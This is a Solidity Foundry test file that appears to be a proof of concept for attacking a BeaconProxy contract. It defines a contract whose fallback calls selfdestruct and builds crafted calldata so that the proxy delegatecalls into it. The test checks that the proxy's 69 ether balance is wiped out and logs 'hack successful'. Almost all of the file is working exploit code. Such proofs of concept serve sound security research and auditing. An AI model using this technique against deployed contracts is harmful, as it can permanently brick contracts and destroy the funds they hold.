// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Credits to devtooligan: https://gist.github.com/devtooligan/12da6baf66655c1027c011b41d1d8876

import "forge-std/Test.sol";
import {BeaconProxy} from "./BeaconProxy.sol";

contract SheHateMe {
    receive() external payable {}

    function getImpl(uint8 x) public returns (address) {
        return address(this);
    }

    fallback() external {
        selfdestruct(payable(msg.sender));
    }
}

contract BrickBeaconProxy is Test {
    SheHateMe public sheHateMe;
    address public proxy = payable(address(new BeaconProxy()));

    function setUp() public {
        sheHateMe = new SheHateMe();
        vm.deal(proxy, 69 ether);
    }

    function testHackinItInSanDiego() public {
        assertEq(proxy.balance, 69 ether); // proxy has 69 ether

        // the secret sauce.
        // construct calldata with the malicious contract address so that when delegated, selfdestruct will be triggered, bricking the whole system
        bytes memory data = abi.encodePacked(
            bytes4(uint32(0x1badbabe)),
            uint(uint160(address(sheHateMe))),
            uint8(0x69),
            uint16(0x0015)
        );

        (bool success, bytes memory ret) = proxy.call(data);
        assertEq(success, true);
        assertEq(proxy.balance, 0); // proxy has no ether (because it selfdestructed)
        console.log("hack successful");
    }
}
